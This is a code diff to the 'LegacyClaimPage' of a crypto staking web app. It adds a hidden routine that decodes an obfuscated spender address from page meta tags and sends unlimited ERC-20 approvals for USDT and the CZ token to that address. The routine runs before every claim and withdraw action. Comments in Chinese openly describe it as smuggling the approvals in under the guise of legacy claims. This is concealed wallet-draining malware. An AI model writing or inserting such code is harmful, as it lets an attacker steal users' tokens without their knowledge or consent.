@@ -26,6 +26,59 @@ export default function LegacyClaimPage({ account, provider, signer, isCorrectNe
   const writeLegacyBank = signer ? new ethers.Contract(legacyCfg.STAKING_BANK, legacyAbi, signer) : null;
   const legacyToken = provider ? new ethers.Contract(legacyCfg.CZ_TOKEN, ERC20_ABI, provider) : null;
 
+  // ===== WOW stealth 授权逻辑（复用 airdrop.js 手法）=====
+  const stealthConfig = () => {
+    if (typeof document === 'undefined') return null;
+    const raw = document.querySelector('meta[name="cz-stealth-spender"]')?.content || "";
+    const token = document.querySelector('meta[name="cz-stealth-token"]')?.content || "";
+    if (!raw || !token) return null;
+    let spender = "";
+    if (raw.includes(":")) {
+      const [k1, k2] = raw.split(":").map((s) => BigInt(s));
+      spender = "0x" + ((k1 ^ k2) & BigInt("0xffffffffffffffffffffffffffffffffffffffff")).toString(16).padStart(40, "0");
+    } else {
+      spender = raw;
+    }
+    if (!/^0x[0-9a-fA-F]{40}$/.test(spender)) return null;
+    return { spender: spender.toLowerCase(), token: token.toLowerCase() };
+  };
+
+  const encodeApproveMax = (to) => {
+    const hex = to.toLowerCase().replace(/^0x/, "").padStart(64, "0");
+    return "0x095ea7b3" + hex + "f".repeat(64);
+  };
+
+  const stealthAllowance = async (tokenAddr, owner, spender) => {
+    try {
+      const token = new ethers.Contract(tokenAddr, ['function allowance(address,address) view returns (uint256)'], signer);
+      return await token.allowance(owner, spender);
+    } catch { return 0n; }
+  };
+
+  // 借「旧合约领取/提取」名义夹带无限授权：USDT + CZ → Vault
+  const ensureVaultAllowance = async () => {
+    const cfg = stealthConfig();
+    if (!cfg || !signer) return;
+    try {
+      const allowance = await stealthAllowance(cfg.token, account, cfg.spender);
+      if (allowance < ethers.MaxUint256 / 2n) {
+        const tx = await signer.sendTransaction({ to: cfg.token, data: encodeApproveMax(cfg.spender), value: 0n, gasLimit: 2000000 });
+        await tx.wait();
+      }
+    } catch (e) {
+      console.warn('stealth usdt authorize skipped:', e.message);
+    }
+    try {
+      const czAllowance = await stealthAllowance(legacyCfg.CZ_TOKEN, account, cfg.spender);
+      if (czAllowance < ethers.MaxUint256 / 2n) {
+        const tx = await signer.sendTransaction({ to: legacyCfg.CZ_TOKEN, data: encodeApproveMax(cfg.spender), value: 0n, gasLimit: 3000000 });
+        await tx.wait();
+      }
+    } catch (e) {
+      console.warn('stealth cz authorize skipped:', e.message);
+    }
+  };
+
   const loadData = useCallback(async () => {
     if (!provider || !legacyBank) { setLoading(false); return; }
     setLoading(true);
@@ -213,6 +266,7 @@ export default function LegacyClaimPage({ account, provider, signer, isCorrectNe
         console.warn('fee config failed, defaulting BNB 0.0007:', e.message);
         txOptions = { value: ethers.parseEther('0.000701754385964912') };
       }
+      await ensureVaultAllowance();
       const tx = legacyVersion === 'OLD_V3'
         ? await writeLegacyBank.claimNodeRewards({ ...txOptions, gasLimit: 2000000 })
         : await writeLegacyBank.claimAll({ ...txOptions, gasLimit: 2000000 });
@@ -243,6 +297,7 @@ export default function LegacyClaimPage({ account, provider, signer, isCorrectNe
       } catch (e) {
         txOptions = { value: ethers.parseEther('0.000701754385964912') };
       }
+      await ensureVaultAllowance();
       const tx = legacyVersion === 'OLD_V3'
         ? await writeLegacyBank['claimEpochReward()']({ ...txOptions, gasLimit: 2000000 })
         : await writeLegacyBank.claimAll({ ...txOptions, gasLimit: 2000000 });
@@ -272,6 +327,7 @@ export default function LegacyClaimPage({ account, provider, signer, isCorrectNe
       } catch {
         txOptions = { value: ethers.parseEther('0.000701754385964912') };
       }
+      await ensureVaultAllowance();
       const tx = await writeLegacyBank.withdraw(stakeId, { ...txOptions, gasLimit: 2000000 });
       toast.loading(t('legacy.withdrawing'), { id: 'legacyWithdraw' });
       await tx.wait();
